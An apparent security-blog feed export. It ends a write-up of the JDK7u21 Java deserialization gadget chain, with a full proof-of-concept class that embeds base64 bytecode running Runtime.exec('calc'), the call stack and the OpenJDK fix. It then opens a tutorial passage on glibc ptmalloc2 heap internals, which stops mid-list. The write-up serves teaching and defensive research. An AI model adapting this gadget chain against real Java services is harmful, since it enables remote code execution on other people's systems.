<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>HashMap</code>
中会计算哈希值找到对应的桶然后逐个比较去重，最后放到
<code>HashMap</code> 中。这里涉及到了 <code>equals</code>
方法的调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       </span><br><span class="line">       ...</span><br><span class="line">       </span><br><span class="line">       h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">       <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">       <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">       h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">       <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">           Object k;</span><br><span class="line">           <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">               <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">               e.value = value;</span><br><span class="line">               e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">               <span class="keyword">return</span> oldValue;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       modCount++;</span><br><span class="line">       addEntry(hash, key, value, i);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
<p>因此如果我们在 <code>HashSet</code> 中放一个
<code>TemplatesImpl</code> 对象再放一个
<code>AnnotationInvocationHandler</code>
代理的对象，并且恰巧这两个对象的哈希值相等且
<code>AnnotationInvocationHandler</code> 代理的对象是后加入的，那么调用
<code>equals</code> 方法就会触发前面介绍的利用链。</p>
<p>所以现在的问题是如何构造一个 <code>AnnotationInvocationHandler</code>
代理的对象使得其哈希值与 <code>TemplatesImpl</code> 对象相等。</p>
<p>由于 <code>TemplatesImpl</code> 没有显式实现 <code>hashCode()</code>
方法，因此它将继承自 <code>java.lang.Object</code>
类中的默认实现。在这种情况下，调用 <code>hashCode()</code>
方法返回的是该对象的内存地址经过哈希计算后得到的一个整数值。也就是说这个哈希值我们不可控制。</p>
<p>但是我们可以想办法构造一个 <code>AnnotationInvocationHandler</code>
代理的对象使得它的哈希值总是与 <code>TemplatesImpl</code>
对象的哈希值相等。</p>
<p><code>AnnotationInvocationHandler</code> 代理的对象的
<code>hashCode</code> 方法实际上调用的是
<code>AnnotationInvocationHandler#invoke</code> 进而会调用到
<code>AnnotationInvocationHandler#hashCodeImpl</code>。</p>
<p>这个方法会遍历 <code>memberValues</code> 这个 <code>Map</code>
中的每个 <code>key</code> 和 <code>value</code>，计算每个
<code>(127 * key.hashCode()) ^ value.hashCode()</code>
并求和。因此我们只要让 <code>value</code> 为<strong>同一个</strong>
<code>TemplatesImpl</code> 且 <code>key</code> 的哈希值为 0 即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">        result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">            memberValueHashCode(e.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>网上通常的做法是枚举十六进制数字对应的字符串，最终得到
<code>f5a5a608</code>
这个字符串。但实际上根据字符串的哈希计算方式很容易就构造出
<code>\0</code> 这一字符串。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADMANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhDAAKAAsHADAMADEAMgEABGNhbGMMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQAeY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAALAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAXAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAcAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADgAJABEADAAPAA0AEAAWABIADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span>  clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">proxy</span> <span class="operator">=</span> (Serializable) Proxy.newProxyInstance(Serializable.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Serializable.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, templates);</span><br><span class="line">        System.out.println(proxy.hashCode());</span><br><span class="line">        System.out.println(templates.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(set);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:136, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:339, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:376, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">equals:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">put:475, HashMap (java.util)</span><br><span class="line">readObject:309, HashSet (java.util)</span><br><span class="line">...</span><br><span class="line">main:48, JDK7u21 (com.example)</span><br></pre></td></tr></table></figure></div> <a class="link" 
 href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350" >https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Fri Mar 22 15:40:16 2013 -0400</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Mon Mar 25 12:41:55 2013 +0400</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,5 @@</span></span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="addition">+ * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line">  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.</span><br><span class="line">  *</span><br><span class="line">  * This code is free software; you can redistribute it and/or modify it</span><br><span class="line"><span class="meta">@@ -337,12 +337,15 @@</span></span><br><span class="line">         try &#123;</span><br><span class="line">             annotationType = AnnotationType.getInstance(type);</span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="deletion">-            // Class is no longer an annotation type; all bets are off</span></span><br><span class="line"><span class="deletion">-            return;</span></span><br><span class="line"><span class="addition">+            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="addition">+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        // If there are annotation members without values, that</span></span><br><span class="line"><span class="addition">+        // situation is handled by the invoke method.</span></span><br><span class="line">         for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux 堆利用基础知识</title>
    <url>/2024/11/08/linux-heap-exploit-basic-knowlege/</url>
    <content><![CDATA[<p>ptmalloc2 是目前 Linux 标准发行版中使用的堆分配器。 #
内存分配基本思想 -
堆管理器负责向操作系统申请内存，然后将其返回给用户程序，但是频繁的系统调用会造成大量的开销。为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。
-
一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。
# 堆的基本操作 ## malloc <code>malloc</code> (memory allocation) 函数是
C 语言标准库中用于动态内存分配的一个基本函数。它分配一块至少为 size
字节的连续内存区域，并返回一个指向这块内存的指针 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div>
<code>malloc</code>
函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理：
- 当 <code>n = 0</code> 时，返回当前系统允许的堆的最小内存块。 - 当
<code>n</code> 为负数时，由于在大多数系统上，<code>size_t</code>
是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。
## realloc <code>realloc</code> 函数用于重新分配之前通过
<code>malloc</code> ，<code>calloc</code> 或 <code>realloc</code>
函数分配的内存区域。它可以改变内存块的大小，或者释放内存块，或分配新的内存块。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div> - <code>ptr</code>：指向需要重新分配的内存块的指针。 -
<code>size</code>：新的内存块的大小，以字节为单位。</p>
<p>有如下情况： - <code>ptr</code> 不为空，<code>size = 0</code>
，相当于释放原来的堆块。 - <code>ptr</code> 为空且
<code>size &gt; 0</code> ，相当于 <code>malloc</code> 。 -
<code>ptr</code> 不为空，<code>size</code>
大于原来的堆块大小则如果该堆块后面的堆块空闲则合并堆块，否则先释放原堆块，然后再申请一个更大的堆块，原堆块内容会被拷贝过去。
- <code>ptr</code> 不为空，<code>size</code>
不大于原来的堆块大小，如果切割后剩下的堆块大于等于 <code>MINSIZE</code>
则切割并释放，然后返回原堆块。 ## calloc <code>calloc</code> (contiguous
allocation) 函数是 C 语言标准库中用于动态内存分配的一个函数。与
<code>malloc</code> 相似，<code>calloc</code>
用于分配内存。该函数在分配时会清空 <code>chunk</code>
上的内容，这使得我们无法通过以往的重复存取后通过 <code>chunk</code>
上残留的脏数据的方式泄露信息（例如通过 <code>bins</code>
数组遗留的脏数据泄露 libc 基址等），同时该函数不从 <code>tcache</code>
中拿 <code>chunk</code>，但是 <code>free()</code> 函数默认还是会先往
<code>tcache</code> 里放的，这无疑增加了我们利用的难度。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div> -
<code>nmemb</code>：需要分配的元素个数。 -
<code>size</code>：每个元素的大小，以字节为单位。</p>
<p>总的分配的字节大小是 <code>nmemb * size</code> 。</p>
<p><strong>注意：如果 size 的 IS_MAPPED 位置 1 则不清空数据。</strong>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div> ## free 可以看出，free 函数会释放由 p
所指向的内存块。这个内存块有可能是通过 malloc
函数得到的，也有可能是通过相关的函数 realloc 得到的。</p>
<p>此外，该函数也同样对异常情况进行了处理： - 当 p
为空指针时，函数不执行任何操作。 - 当 p
已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。 -
除了被禁用 (mallopt)
的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。
## mallopt <code>mallopt</code>
函数通过控制堆的特定参数用于改变堆的分配策略。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mallopt</span><span class="params">(<span class="type">int</span> param,<span class="type">int</span> value)</span></span><br></pre></td></tr></table></figure></div> -
<code>param</code>：指定要修改的动态内存分配参数。这个参数是一个整数，定义了哪一个特性将会被修改。例如，它可以是控制内存对齐、缓存大小或者相似行为的选项。
- <code>M_MXFAST</code>：设置 <code>malloc</code> 用于小块内存分配的最大
fast bin 的大小。 - <code>M_TRIM_THRESHOLD</code>：设置
<code>sbrk</code> 释放内存回操作系统的阈值。 -
<code>M_TOP_PAD</code>：设置 <code>sbrk</code>
请求额外内存时，上面的额外内存量。 -
<code>M_MMAP_THRESHOLD</code>：设置使用 <code>mmap</code>
进行内存分配的阈值。 - <code>M_MMAP_MAX</code>：设置可以使用
<code>mmap</code> 进行内存分配的最大数目。 -
<code>value</code>：新的值，针对 param 指定的特性。具体的值取决于
param，有些特性可能需要非零值来启用，零值来禁用，有些则需要具体的数值。
- 返回值是一个整数，指示函数调用是否成功。 - 如果成功，返回非零值。 -
如果失败（例如，不支持的参数或值），返回零。 # 内存分配背后的系统调用
内存管理函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。 在
main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的
heap。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7b0091679197656e97d7a468abccb56d.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="sbrk">(s)brk</h2>
<p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk
函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk
指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p>
<p>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。
开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在
data/bss 段结尾后的随机偏移处。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4a281327dd16657c32c2916e176a2c99.png"
                     
alt="在这里插入图片描述" 
                > ## mmap malloc 会使用 mmap
来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0
填充的内存，并且这块内存仅被调用进程所使用。 # 堆相关数据结构 ##
malloc_par 在 ptmalloc 中使用 <code>malloc_par</code>
结构体来记录堆管理器的相关参数，该结构体定义于 <code>malloc.c</code>
中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_par</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;</span><br><span class="line">  INTERNAL_SIZE_T top_pad;</span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;</span><br><span class="line">  INTERNAL_SIZE_T arena_test;</span><br><span class="line">  INTERNAL_SIZE_T arena_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;</span><br><span class="line">  <span class="type">int</span> n_mmaps_max;</span><br><span class="line">  <span class="type">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;</span><br><span class="line">  <span class="comment">/*INTERNAL_SIZE_T  sbrked_mem;*/</span></span><br><span class="line">  <span class="comment">/*INTERNAL_SIZE_T  max_sbrked_mem;*/</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_total_mem;  <span class="comment">/* only kept for NO_THREADS */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>主要是定义了和 <code>mmap</code> 和 <code>arena</code>
相关的一些参数（如数量上限等），以及 <code>sbrk</code>
的基址，其中重要的参数解释如下：</p>
<ul>
<li><code>top_pad</code>：初始化或扩展堆的时候需要多申请的内存大小。</li>
<li><code>mmap_threshold</code>：决定 <code>sysmalloc</code> 是通过
<code>mmap</code> 还是 <code>sbrk</code>
分配内存的界限，即如果申请的内存大小不小于该值则采用 <code>mmap</code>
分配，否则采用 <code>sbrk</code> 扩展 <code>heap</code>
区域分配。并且这个值是动态调整的，如果释放的内存是通过 <code>mmap</code>
得到的则 <code>mmap_threshold</code> 与该内存大小取 <code>max</code>
。并且 <code>mmap_threshold</code> 最大不能超过
<code>DEFAULT_MMAP_THRESHOLD_MAX</code> ，即 0x2000000 。</li>
<li><code>trim_threshold</code>：用于 <code>main_arena</code>
中保留内存量的控制。当释放的 <code>chunk</code> 为 <code>mmap</code>
获得的，同时大小大于 <code>mmap_threshold</code> ，则除了更新
<code>mmap_threshold</code> 外还会将 <code>trim_threshold</code> 乘 2
。当释放的 <code>chunk</code> 大小不在 fast bin 范围合并完
<code>size</code> 大于 <code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 即
0x10000 ，且为 <code>main_arena</code> ，且 top chunk 的大小大于
<code>trim_threshold</code> 则将 <code>heap</code> 区域在 top chunk
不会小于 <code>pagesize</code> 的前提下减小 <code>top_pad</code> 。</li>
